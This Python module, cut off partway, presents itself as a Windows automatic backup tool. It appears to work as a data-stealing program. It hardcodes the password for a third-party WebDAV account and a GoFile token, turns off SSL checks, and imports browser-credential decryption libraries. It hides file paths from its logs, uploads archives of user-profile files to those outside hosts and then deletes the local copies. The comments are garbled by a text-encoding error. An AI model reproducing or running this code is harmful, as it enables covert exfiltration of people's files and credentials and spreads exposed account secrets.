# -*- coding: utf-8 -*-
"""
Windowsè‡ªåŠ¨å¤‡ä»½å’Œä¸Šä¼ å·¥å…·
åŠŸèƒ½ï¼šå¤‡ä»½Windowsç³»ç»Ÿä¸­çš„é‡è¦æ–‡ä»¶ï¼Œå¹¶è‡ªåŠ¨ä¸Šä¼ åˆ°äº‘å­˜å‚¨
"""

# å…ˆå¯¼å…¥æ ‡å‡†åº“
import os
import shutil
import time
import socket
import logging
import platform
import tarfile
import threading
import getpass
import json
import base64
import sqlite3
import sys
from datetime import datetime, timedelta
from functools import lru_cache

import_failed = False
try:
    import requests
    from requests.auth import HTTPBasicAuth
except ImportError as e:
    print(f"âš  è­¦å‘Š: æ— æ³•å¯¼å…¥ requests åº“: {str(e)}")
    requests = None
    HTTPBasicAuth = None
    import_failed = True

try:
    import pyperclip
except ImportError as e:
    print(f"âš  è­¦å‘Š: æ— æ³•å¯¼å…¥ pyperclip åº“: {str(e)}")
    pyperclip = None
    import_failed = True

try:
    import urllib3
    # ç¦ç”¨SSLè­¦å‘Š
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError as e:
    print(f"âš  è­¦å‘Š: æ— æ³•å¯¼å…¥ urllib3 åº“: {str(e)}")
    urllib3 = None
    import_failed = True

if import_failed:
    print("âš  è­¦å‘Š: éƒ¨åˆ†ä¾èµ–å¯¼å…¥å¤±è´¥ï¼Œç¨‹åºå°†ç»§ç»­è¿è¡Œï¼Œä½†ç›¸å…³åŠŸèƒ½å¯èƒ½ä¸å¯ç”¨")

# å°è¯•å¯¼å…¥æµè§ˆå™¨æ•°æ®å¯¼å‡ºæ‰€éœ€çš„åº“
BROWSER_EXPORT_AVAILABLE = False
try:
    from win32crypt import CryptUnprotectData
    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Random import get_random_bytes
    BROWSER_EXPORT_AVAILABLE = True
except ImportError:
    logging.warning("æµè§ˆå™¨æ•°æ®å¯¼å‡ºåŠŸèƒ½ä¸å¯ç”¨ï¼šç¼ºå°‘ pywin32 æˆ– pycryptodome åº“")

# ä» config æ¨¡å—å¯¼å…¥ BackupConfig
from .config import BackupConfig

class BackupManager:
    """å¤‡ä»½ç®¡ç†å™¨ç±»"""
    
    def __init__(self):
        """åˆå§‹åŒ–å¤‡ä»½ç®¡ç†å™¨"""
        self.config = BackupConfig()
        
        # Infini Cloud é…ç½®
        self.infini_url = "https://wajima.infini-cloud.net/dav/"
        self.infini_user = "messiahxp"
        self.infini_pass = "U5tzgpQeTVr4j5T7"
        
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        self.config.INFINI_REMOTE_BASE_DIR = f"{user_prefix}_wins_backup"
        
        # é…ç½® requests session ç”¨äºä¸Šä¼ 
        self.session = requests.Session()
        self.session.verify = False  # ç¦ç”¨SSLéªŒè¯
        self.auth = HTTPBasicAuth(self.infini_user, self.infini_pass)
        
        # GoFile API tokenï¼ˆå¤‡é€‰æ–¹æ¡ˆï¼‰
        self.api_token = "8HSdvkTfGNDxlhQFShQkkmJK2Yh8zWPQ"
        
        self._setup_logging()

    def _setup_logging(self):
        """é…ç½®æ—¥å¿—ç³»ç»Ÿ"""
        try:
            # ç¡®ä¿æ—¥å¿—ç›®å½•å­˜åœ¨
            log_dir = os.path.dirname(self.config.LOG_FILE)
            os.makedirs(log_dir, exist_ok=True)
            
            # è‡ªå®šä¹‰æ—¥å¿—æ ¼å¼åŒ–å™¨
            class PathFilter(logging.Formatter):
                def format(self, record):
                    # è¿‡æ»¤æ‰è·¯å¾„ç›¸å…³çš„æ—¥å¿—
                    if isinstance(record.msg, str):
                        msg = record.msg
                        # è·³è¿‡è·¯å¾„ç›¸å…³çš„æ—¥å¿—
                        if any(x in msg for x in ["æ£€æŸ¥ç›®å½•:", "æ’é™¤ç›®å½•:", ":\\", "/"]):
                            return None
                        # ä¿ç•™è¿›åº¦å’ŒçŠ¶æ€ä¿¡æ¯
                        if any(x in msg for x in ["å·²å¤‡ä»½", "å®Œæˆ", "å¤±è´¥", "é”™è¯¯", "æˆåŠŸ", "ğŸ“", "âœ…", "âŒ", "â³", "ğŸ“‹"]):
                            return super().format(record)
                        # å…¶ä»–æ™®é€šæ—¥å¿—
                        return super().format(record)
                    return super().format(record)
            
            # è‡ªå®šä¹‰è¿‡æ»¤å™¨
            class MessageFilter(logging.Filter):
                def filter(self, record):
                    if isinstance(record.msg, str):
                        # è¿‡æ»¤æ‰è·¯å¾„ç›¸å…³çš„æ—¥å¿—
                        if any(x in record.msg for x in ["æ£€æŸ¥ç›®å½•:", "æ’é™¤ç›®å½•:", ":\\", "/"]):
                            return False
                    return True
            
            # é…ç½®æ–‡ä»¶å¤„ç†å™¨
            file_handler = logging.FileHandler(
                self.config.LOG_FILE, 
                encoding='utf-8'
            )
            file_formatter = PathFilter('%(asctime)s - %(levelname)s - %(message)s')
            file_handler.setFormatter(file_formatter)
            file_handler.addFilter(MessageFilter())
            
            # é…ç½®æ§åˆ¶å°å¤„ç†å™¨
            console_handler = logging.StreamHandler()
            console_formatter = PathFilter('%(message)s')
            console_handler.setFormatter(console_formatter)
            console_handler.addFilter(MessageFilter())
            
            # é…ç½®æ ¹æ—¥å¿—è®°å½•å™¨
            root_logger = logging.getLogger()
            root_logger.setLevel(
                logging.DEBUG if self.config.DEBUG_MODE else logging.INFO
            )
            
            # æ¸…é™¤ç°æœ‰å¤„ç†å™¨
            root_logger.handlers.clear()
            
            # æ·»åŠ å¤„ç†å™¨
            root_logger.addHandler(file_handler)
            root_logger.addHandler(console_handler)
            
            logging.info("æ—¥å¿—ç³»ç»Ÿåˆå§‹åŒ–å®Œæˆ")
        except (OSError, IOError, PermissionError) as e:
            print(f"è®¾ç½®æ—¥å¿—ç³»ç»Ÿæ—¶å‡ºé”™: {e}")

    @staticmethod
    def _get_dir_size(directory):
        """è·å–ç›®å½•æ€»å¤§å°
        
        Args:
            directory: ç›®å½•è·¯å¾„
            
        Returns:
            int: ç›®å½•å¤§å°ï¼ˆå­—èŠ‚ï¼‰
        """
        total_size = 0
        for dirpath, _, filenames in os.walk(directory):
            for filename in filenames:
                file_path = os.path.join(dirpath, filename)
                try:
                    total_size += os.path.getsize(file_path)
                except (OSError, IOError) as e:
                    logging.error(f"è·å–æ–‡ä»¶å¤§å°å¤±è´¥ {file_path}: {e}")
        return total_size

    @staticmethod
    def _ensure_directory(directory_path):
        """ç¡®ä¿ç›®å½•å­˜åœ¨
        
        Args:
            directory_path: ç›®å½•è·¯å¾„
            
        Returns:
            bool: ç›®å½•æ˜¯å¦å¯ç”¨
        """
        try:
            if os.path.exists(directory_path):
                if not os.path.isdir(directory_path):
                    logging.error(f"è·¯å¾„å­˜åœ¨ä½†ä¸æ˜¯ç›®å½•: {directory_path}")
                    return False
                if not os.access(directory_path, os.W_OK):
                    logging.error(f"ç›®å½•æ²¡æœ‰å†™å…¥æƒé™: {directory_path}")
                    return False
            else:
                os.makedirs(directory_path, exist_ok=True)
            return True
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"åˆ›å»ºç›®å½•å¤±è´¥ {directory_path}: {e}")
            return False

    @staticmethod
    def _clean_directory(directory_path):
        """æ¸…ç†å¹¶é‡æ–°åˆ›å»ºç›®å½•
        
        Args:
            directory_path: ç›®å½•è·¯å¾„
            
        Returns:
            bool: æ“ä½œæ˜¯å¦æˆåŠŸ
        """
        try:
            if os.path.exists(directory_path):
                shutil.rmtree(directory_path, ignore_errors=True)
            return BackupManager._ensure_directory(directory_path)
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"æ¸…ç†ç›®å½•å¤±è´¥ {directory_path}: {e}")
            return False

    @staticmethod
    def _check_internet_connection():
        """æ£€æŸ¥ç½‘ç»œè¿æ¥
        
        Returns:
            bool: æ˜¯å¦æœ‰ç½‘ç»œè¿æ¥
        """
        for host, port in BackupConfig.NETWORK_CHECK_HOSTS:
            try:
                socket.create_connection((host, port), timeout=BackupConfig.NETWORK_TIMEOUT)
                return True
            except (socket.timeout, socket.error) as e:
                logging.debug(f"è¿æ¥ {host}:{port} å¤±è´¥: {e}")
                continue
        return False

    @staticmethod
    def _is_valid_file(file_path):
        """æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æœ‰æ•ˆ
        
        Args:
            file_path: æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: æ–‡ä»¶æ˜¯å¦æœ‰æ•ˆ
        """
        try:
            return os.path.isfile(file_path) and os.path.getsize(file_path) > 0
        except Exception:
            return False

    def _safe_remove_file(self, file_path, retry=True):
        """å®‰å…¨åˆ é™¤æ–‡ä»¶ï¼Œæ”¯æŒé‡è¯•æœºåˆ¶
        
        Args:
            file_path: è¦åˆ é™¤çš„æ–‡ä»¶è·¯å¾„
            retry: æ˜¯å¦ä½¿ç”¨é‡è¯•æœºåˆ¶
            
        Returns:
            bool: åˆ é™¤æ˜¯å¦æˆåŠŸ
        """
        if not os.path.exists(file_path):
            return True
        
        if not retry:
            try:
                os.remove(file_path)
                return True
            except (OSError, IOError, PermissionError):
                return False
        
        # ä½¿ç”¨é‡è¯•æœºåˆ¶åˆ é™¤æ–‡ä»¶
        try:
            # ç­‰å¾…æ–‡ä»¶å¥æŸ„å®Œå…¨é‡Šæ”¾
            time.sleep(self.config.FILE_DELAY_AFTER_UPLOAD)
            for _ in range(self.config.FILE_DELETE_RETRY_COUNT):
                try:
                    if os.path.exists(file_path):
                        os.remove(file_path)
                    return True
                except PermissionError:
                    time.sleep(self.config.FILE_DELETE_RETRY_DELAY)
                except (OSError, IOError) as e:
                    logging.debug(f"åˆ é™¤æ–‡ä»¶é‡è¯•ä¸­: {str(e)}")
                    time.sleep(self.config.FILE_DELAY_AFTER_UPLOAD)
            return False
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"åˆ é™¤æ–‡ä»¶å¤±è´¥: {str(e)}")
            return False

    def _get_upload_server(self):
        """è·å–ä¸Šä¼ æœåŠ¡å™¨åœ°å€
    
        Returns:
            str: ä¸Šä¼ æœåŠ¡å™¨URL
        """
        return "https://store9.gofile.io/uploadFile"

    def split_large_file(self, file_path):
        """å°†å¤§æ–‡ä»¶åˆ†å‰²æˆå°å—
        
        Args:
            file_path: è¦åˆ†å‰²çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            list: åˆ†ç‰‡æ–‡ä»¶è·¯å¾„åˆ—è¡¨ï¼Œå¦‚æœä¸éœ€è¦åˆ†å‰²åˆ™è¿”å›None
        """
        if not os.path.exists(file_path):
            return None
        
        file_size = os.path.getsize(file_path)
        if file_size <= self.config.MAX_SINGLE_FILE_SIZE:
            return None
        
        try:
            chunk_files = []
            chunk_dir = os.path.join(os.path.dirname(file_path), "chunks")
            if not self._ensure_directory(chunk_dir):
                return None
            
            base_name = os.path.basename(file_path)
            with open(file_path, 'rb') as f:
                chunk_num = 0
                while True:
                    chunk_data = f.read(self.config.CHUNK_SIZE)
                    if not chunk_data:
                        break
                    
                    chunk_name = f"{base_name}.part{chunk_num:03d}"
                    chunk_path = os.path.join(chunk_dir, chunk_name)
                    
                    with open(chunk_path, 'wb') as chunk_file:
                        chunk_file.write(chunk_data)
                    chunk_files.append(chunk_path)
                    chunk_num += 1
                
            logging.critical(f"æ–‡ä»¶ {file_path} å·²åˆ†å‰²ä¸º {len(chunk_files)} ä¸ªåˆ†ç‰‡")
            return chunk_files
        except (OSError, IOError, PermissionError, MemoryError) as e:
            logging.error(f"åˆ†å‰²æ–‡ä»¶å¤±è´¥ {file_path}: {e}")
            return None

    def upload_file(self, file_path):
        """ä¸Šä¼ æ–‡ä»¶åˆ°æœåŠ¡å™¨
        
        Args:
            file_path: è¦ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        if not self._is_valid_file(file_path):
            logging.error(f"æ–‡ä»¶ {file_path} ä¸ºç©ºæˆ–æ— æ•ˆï¼Œè·³è¿‡ä¸Šä¼ ")
            return False

        # æ£€æŸ¥æ–‡ä»¶å¤§å°å¹¶åœ¨éœ€è¦æ—¶åˆ†ç‰‡
        chunk_files = self.split_large_file(file_path)
        if chunk_files:
            success = True
            for chunk_file in chunk_files:
                if not self._upload_single_file(chunk_file):
                    success = False
            # ä»…åœ¨å…¨éƒ¨åˆ†ç‰‡ä¸Šä¼ æˆåŠŸåæ¸…ç†åˆ†ç‰‡ç›®å½•ä¸åŸå§‹æ–‡ä»¶
            if success:
                chunk_dir = os.path.dirname(chunk_files[0])
                self._clean_directory(chunk_dir)
                # è‹¥åŸå§‹æ–‡ä»¶ä»åœ¨ï¼Œä¸Šä¼ æˆåŠŸååˆ é™¤
                if os.path.exists(file_path):
                    self._safe_remove_file(file_path, retry=True)
            return success
        else:
            return self._upload_single_file(file_path)

    def _create_remote_directory(self, remote_dir):
        """åˆ›å»ºè¿œç¨‹ç›®å½•ï¼ˆä½¿ç”¨ WebDAV MKCOL æ–¹æ³•ï¼‰"""
        if not remote_dir or remote_dir == '.':
            return True
        
        try:
            # æ„å»ºç›®å½•è·¯å¾„
            dir_path = f"{self.infini_url.rstrip('/')}/{remote_dir.lstrip('/')}"
            
            response = self.session.request('MKCOL', dir_path, auth=self.auth, timeout=(8, 8))
            
            if response.status_code in [201, 204, 405]:  # 405 è¡¨ç¤ºå·²å­˜åœ¨
                return True
            elif response.status_code == 409:
                # 409 å¯èƒ½è¡¨ç¤ºçˆ¶ç›®å½•ä¸å­˜åœ¨ï¼Œå°è¯•åˆ›å»ºçˆ¶ç›®å½•
                parent_dir = os.path.dirname(remote_dir)
                if parent_dir and parent_dir != '.':
                    if self._create_remote_directory(parent_dir):
                        # çˆ¶ç›®å½•åˆ›å»ºæˆåŠŸï¼Œå†æ¬¡å°è¯•åˆ›å»ºå½“å‰ç›®å½•
                        response = self.session.request('MKCOL', dir_path, auth=self.auth, timeout=(8, 8))
                        return response.status_code in [201, 204, 405]
                return False
            else:
                return False
        except Exception:
            return False

    def _upload_single_file_infini(self, file_path):
        """ä¸Šä¼ å•ä¸ªæ–‡ä»¶åˆ° Infini Cloudï¼ˆä½¿ç”¨ WebDAV PUT æ–¹æ³•ï¼‰"""
        try:
            # æ£€æŸ¥æ–‡ä»¶æƒé™å’ŒçŠ¶æ€
            if not os.path.exists(file_path):
                logging.error(f"æ–‡ä»¶ä¸å­˜åœ¨: {file_path}")
                return False
                
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"æ–‡ä»¶å¤§å°ä¸º0: {file_path}")
                return False
                
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"æ–‡ä»¶è¿‡å¤§ {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
                return False

            # æ„å»ºè¿œç¨‹è·¯å¾„
            filename = os.path.basename(file_path)
            remote_filename = f"{self.config.INFINI_REMOTE_BASE_DIR}/{filename}"
            remote_path = f"{self.infini_url.rstrip('/')}/{remote_filename.lstrip('/')}"
            
            # åˆ›å»ºè¿œç¨‹ç›®å½•ï¼ˆå¦‚æœéœ€è¦ï¼‰
            remote_dir = os.path.dirname(remote_filename)
            if remote_dir and remote_dir != '.':
                if not self._create_remote_directory(remote_dir):
                    logging.warning(f"æ— æ³•åˆ›å»ºè¿œç¨‹ç›®å½•: {remote_dir}ï¼Œå°†ç»§ç»­å°è¯•ä¸Šä¼ ")

            # ä¸Šä¼ é‡è¯•é€»è¾‘
            for attempt in range(self.config.RETRY_COUNT):
                if not self._check_internet_connection():
                    logging.error("ç½‘ç»œè¿æ¥ä¸å¯ç”¨ï¼Œç­‰å¾…é‡è¯•...")
                    time.sleep(self.config.RETRY_DELAY)
                    continue

                try:
                    # æ ¹æ®æ–‡ä»¶å¤§å°åŠ¨æ€è°ƒæ•´è¶…æ—¶æ—¶é—´
                    if file_size < 1024 * 1024:  # å°äº1MB
                        connect_timeout = 10
                        read_timeout = 30
                    elif file_size < 10 * 1024 * 1024:  # 1-10MB
                        connect_timeout = 15
                        read_timeout = max(30, int(file_size / 1024 / 1024 * 5))
                    else:  # å¤§äº10MB
                        connect_timeout = 20
                        read_timeout = max(60, int(file_size / 1024 / 1024 * 6))
                    
                    # åªåœ¨ç¬¬ä¸€æ¬¡å°è¯•æ—¶æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯
                    if attempt == 0:
                        size_str = f"{file_size / 1024 / 1024:.2f}MB" if file_size >= 1024 * 1024 else f"{file_size / 1024:.2f}KB"
                        logging.critical(f"ğŸ“¤ [Infini Cloud] ä¸Šä¼ : {filename} ({size_str})")
                    elif self.config.DEBUG_MODE:
                        logging.debug(f"[Infini Cloud] é‡è¯•ä¸Šä¼ : {filename} (ç¬¬ {attempt + 1} æ¬¡)")
                    
                    # å‡†å¤‡è¯·æ±‚å¤´
                    headers = {
                        'Content-Type': 'application/octet-stream',
                        'Content-Length': str(file_size),
                    }
                    
                    # æ‰§è¡Œä¸Šä¼ ï¼ˆä½¿ç”¨ WebDAV PUT æ–¹æ³•ï¼‰
                    with open(file_path, 'rb') as f:
                        response = self.session.put(
                            remote_path,
                            data=f,
                            headers=headers,
                            auth=self.auth,
                            timeout=(connect_timeout, read_timeout),
                            stream=False
                        )
                    
                    if response.status_code in [201, 204]:
                        logging.critical(f"âœ… [Infini Cloud] {filename}")
                        return True
                    elif response.status_code == 403:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"âŒ [Infini Cloud] {filename}: æƒé™ä¸è¶³")
                    elif response.status_code == 404:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"âŒ [Infini Cloud] {filename}: è¿œç¨‹è·¯å¾„ä¸å­˜åœ¨")
                    elif response.status_code == 409:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"âŒ [Infini Cloud] {filename}: è¿œç¨‹è·¯å¾„å†²çª")
                    else:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"âŒ [Infini Cloud] {filename}: çŠ¶æ€ç  {response.status_code}")
                        
                except requests.exceptions.Timeout:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [Infini Cloud] {os.path.basename(file_path)}: è¶…æ—¶")
                except requests.exceptions.SSLError as e:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [Infini Cloud] {os.path.basename(file_path)}: SSLé”™è¯¯")
                except requests.exceptions.ConnectionError as e:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [Infini Cloud] {os.path.basename(file_path)}: è¿æ¥é”™è¯¯")
                except Exception as e:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [Infini Cloud] {os.path.basename(file_path)}: {str(e)}")

                if attempt < self.config.RETRY_COUNT - 1:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"ç­‰å¾… {self.config.RETRY_DELAY} ç§’åé‡è¯•...")
                    time.sleep(self.config.RETRY_DELAY)

            return False
            
        except OSError as e:
            logging.error(f"è·å–æ–‡ä»¶ä¿¡æ¯å¤±è´¥ {file_path}: {e}")
            return False
        except Exception as e:
            logging.error(f"[Infini Cloud] ä¸Šä¼ è¿‡ç¨‹å‡ºé”™: {e}")
            return False

    def _upload_single_file_gofile(self, file_path):
        """ä¸Šä¼ å•ä¸ªæ–‡ä»¶åˆ° GoFileï¼ˆå¤‡é€‰æ–¹æ¡ˆï¼‰
        
        Args:
            file_path: è¦ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        if not os.path.exists(file_path):
            logging.error(f"æ–‡ä»¶ä¸å­˜åœ¨: {file_path}")
            return False

        try:
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"æ–‡ä»¶å¤§å°ä¸º0: {file_path}")
                return False
            
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"æ–‡ä»¶è¿‡å¤§: {file_path} ({file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB)")
                return False

            filename = os.path.basename(file_path)
            logging.info(f"ğŸ”„ å°è¯•ä½¿ç”¨ GoFile ä¸Šä¼ : {filename}")

            server_index = 0
            total_retries = 0
            max_total_retries = len(self.config.UPLOAD_SERVERS) * self.config.MAX_SERVER_RETRIES
            upload_success = False

            while total_retries < max_total_retries and not upload_success:
                if not self._check_internet_connection():
                    logging.error("ç½‘ç»œè¿æ¥ä¸å¯ç”¨ï¼Œç­‰å¾…é‡è¯•...")
                    time.sleep(self.config.RETRY_DELAY)
                    total_retries += 1
                    continue

                current_server = self.config.UPLOAD_SERVERS[server_index]
                try:
                    # ä½¿ç”¨ with è¯­å¥ç¡®ä¿æ–‡ä»¶æ­£ç¡®å…³é—­
                    with open(file_path, "rb") as f:
                        response = requests.post(
                            current_server,
                            files={"file": f},
                            data={"token": self.api_token},
                            timeout=self.config.UPLOAD_TIMEOUT,
                            verify=True
                        )

                        if response.ok:
                            try:
                                result = response.json()
                                if result.get("status") == "ok":
                                    logging.critical(f"âœ… [GoFile] {filename}")
                                    upload_success = True
                                    break
                                else:
                                    error_msg = result.get("message", "æœªçŸ¥é”™è¯¯")
                                    error_code = result.get("code", 0)
                                    if total_retries == 0 or self.config.DEBUG_MODE:
                                        logging.error(f"[GoFile] æœåŠ¡å™¨è¿”å›é”™è¯¯ (ä»£ç : {error_code}): {error_msg}")
                                    
                                    # å¤„ç†ç‰¹å®šé”™è¯¯ç 
                                    if error_code in [402, 405]:  # æœåŠ¡å™¨é™åˆ¶æˆ–æƒé™é”™è¯¯
                                        server_index = (server_index + 1) % len(self.config.UPLOAD_SERVERS)
                                        if server_index == 0:  # å¦‚æœå·²ç»å°è¯•äº†æ‰€æœ‰æœåŠ¡å™¨
                                            time.sleep(self.config.RETRY_DELAY * 2)  # å¢åŠ ç­‰å¾…æ—¶é—´
                            except (ValueError, KeyError) as e:
                                if total_retries == 0 or self.config.DEBUG_MODE:
                                    logging.error(f"[GoFile] æœåŠ¡å™¨è¿”å›æ— æ•ˆJSONæ•°æ®: {str(e)}")
                        else:
                            if total_retries == 0 or self.config.DEBUG_MODE:
                                logging.error(f"[GoFile] ä¸Šä¼ å¤±è´¥ï¼ŒHTTPçŠ¶æ€ç : {response.status_code}")

                except requests.exceptions.Timeout:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [GoFile] {filename}: è¶…æ—¶")
                except requests.exceptions.SSLError as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [GoFile] {filename}: SSLé”™è¯¯")
                except requests.exceptions.ConnectionError as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [GoFile] {filename}: è¿æ¥é”™è¯¯")
                except requests.exceptions.RequestException as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [GoFile] {filename}: è¯·æ±‚å¼‚å¸¸")
                except (OSError, IOError) as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [GoFile] {filename}: æ–‡ä»¶è¯»å–é”™è¯¯")
                except Exception as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [GoFile] {filename}: {str(e)}")

                # åˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ªæœåŠ¡å™¨
                server_index = (server_index + 1) % len(self.config.UPLOAD_SERVERS)
                if server_index == 0:
                    time.sleep(self.config.RETRY_DELAY)  # æ‰€æœ‰æœåŠ¡å™¨éƒ½å°è¯•è¿‡åç­‰å¾…
                
                total_retries += 1

            if upload_success:
                return True
            else:
                logging.error(f"âŒ [GoFile] {filename}: ä¸Šä¼ å¤±è´¥ï¼Œå·²è¾¾åˆ°æœ€å¤§é‡è¯•æ¬¡æ•°")
                return False

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"[GoFile] å¤„ç†æ–‡ä»¶æ—¶å‡ºé”™: {str(e)}")
            return False
        except Exception as e:
            logging.error(f"[GoFile] å¤„ç†æ–‡ä»¶æ—¶å‡ºç°æœªçŸ¥é”™è¯¯: {str(e)}")
            return False

    def _upload_single_file(self, file_path):
        """ä¸Šä¼ å•ä¸ªæ–‡ä»¶ï¼Œä¼˜å…ˆä½¿ç”¨ Infini Cloudï¼Œå¤±è´¥åˆ™ä½¿ç”¨ GoFile å¤‡é€‰æ–¹æ¡ˆ
        
        Args:
            file_path: è¦ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        if not os.path.exists(file_path):
            logging.error(f"æ–‡ä»¶ä¸å­˜åœ¨: {file_path}")
            return False

        try:
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"æ–‡ä»¶å¤§å°ä¸º0: {file_path}")
                self._safe_remove_file(file_path, retry=False)
                return False
            
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"æ–‡ä»¶è¿‡å¤§: {file_path} ({file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB)")
                self._safe_remove_file(file_path, retry=False)
                return False

            # ä¼˜å…ˆå°è¯• Infini Cloud ä¸Šä¼ 
            if self._upload_single_file_infini(file_path):
                self._safe_remove_file(file_path, retry=True)
                return True

            # Infini Cloud ä¸Šä¼ å¤±è´¥ï¼Œå°è¯•ä½¿ç”¨ GoFile å¤‡é€‰æ–¹æ¡ˆ
            logging.warning(f"âš ï¸ Infini Cloud ä¸Šä¼ å¤±è´¥ï¼Œå°è¯•ä½¿ç”¨ GoFile å¤‡é€‰æ–¹æ¡ˆ: {os.path.basename(file_path)}")
            if self._upload_single_file_gofile(file_path):
                self._safe_remove_file(file_path, retry=True)
                return True
            
            # ä¸¤ä¸ªæ–¹æ³•éƒ½å¤±è´¥
            logging.error(f"âŒ {os.path.basename(file_path)}: æ‰€æœ‰ä¸Šä¼ æ–¹æ³•å‡å¤±è´¥")
            return False

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"å¤„ç†æ–‡ä»¶æ—¶å‡ºé”™: {str(e)}")
            self._safe_remove_file(file_path, retry=False)
            return False
        except Exception as e:
            logging.error(f"å¤„ç†æ–‡ä»¶æ—¶å‡ºç°æœªçŸ¥é”™è¯¯: {str(e)}")
            return False

    def zip_backup_folder(self, folder_path, zip_file_path):
        """å‹ç¼©å¤‡ä»½æ–‡ä»¶å¤¹ä¸ºtar.gzæ ¼å¼
        
        Args:
            folder_path: è¦å‹ç¼©çš„æ–‡ä»¶å¤¹è·¯å¾„
            zip_file_path: å‹ç¼©æ–‡ä»¶è·¯å¾„ï¼ˆä¸å«æ‰©å±•åï¼‰
            
        Returns:
            str or list: å‹ç¼©æ–‡ä»¶è·¯å¾„æˆ–å‹ç¼©æ–‡ä»¶è·¯å¾„åˆ—è¡¨
        """
        try:
            if folder_path is None or not os.path.exists(folder_path):
                return None

            # æ£€æŸ¥æºç›®å½•æ˜¯å¦ä¸ºç©º
            total_files = sum(len(files) for _, _, files in os.walk(folder_path))
            if total_files == 0:
                logging.error(f"æºç›®å½•ä¸ºç©º {folder_path}")
                return None

            # è®¡ç®—æºç›®å½•å¤§å°
            dir_size = 0
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    try:
                        file_path = os.path.join(dirpath, filename)
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:  # è·³è¿‡ç©ºæ–‡ä»¶
                            dir_size += file_size
                    except OSError as e:
                        logging.error(f"è·å–æ–‡ä»¶å¤§å°å¤±è´¥ {file_path}: {e}")
                        continue

            if dir_size == 0:
                logging.error(f"æºç›®å½•å®é™…å¤§å°ä¸º0 {folder_path}")
                return None

            if dir_size > self.config.MAX_SOURCE_DIR_SIZE:
                return self.split_large_directory(folder_path, zip_file_path)

            tar_path = f"{zip_file_path}.tar.gz"
            if os.path.exists(tar_path):
                os.remove(tar_path)

            with tarfile.open(tar_path, "w:gz") as tar:
                tar.add(folder_path, arcname=os.path.basename(folder_path))

            # éªŒè¯å‹ç¼©æ–‡ä»¶
            try:
                compressed_size = os.path.getsize(tar_path)
                if compressed_size == 0:
                    logging.error(f"å‹ç¼©æ–‡ä»¶å¤§å°ä¸º0 {tar_path}")
                    if os.path.exists(tar_path):
                        os.remove(tar_path)
                    return None
                    
                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                    os.remove(tar_path)
                    return self.split_large_directory(folder_path, zip_file_path)

                self._clean_directory(folder_path)
                return tar_path
            except OSError as e:
                logging.error(f"è·å–å‹ç¼©æ–‡ä»¶å¤§å°å¤±è´¥ {tar_path}: {e}")
                if os.path.exists(tar_path):
                    os.remove(tar_path)
                return None
                
        except (OSError, IOError, PermissionError, tarfile.TarError) as e:
            logging.error(f"å‹ç¼©å¤±è´¥ {folder_path}: {e}")
            return None

    def backup_specified_files(self, source_dir, target_dir):
        """å¤‡ä»½æŒ‡å®šçš„é‡è¦ç›®å½•å’Œæ–‡ä»¶ï¼ˆæ¡Œé¢ã€ä¾¿ç­¾ã€å†å²è®°å½•ç­‰ï¼‰
        
        Args:
            source_dir: æºç›®å½•è·¯å¾„ï¼ˆé€šå¸¸ä¸º %USERPROFILE%ï¼‰
            target_dir: ç›®æ ‡ç›®å½•è·¯å¾„
            
        Returns:
            str: å¤‡ä»½ç›®å½•è·¯å¾„ï¼Œå¦‚æœå¤±è´¥åˆ™è¿”å› None
        """
        source_dir = os.path.abspath(os.path.expandvars(source_dir))
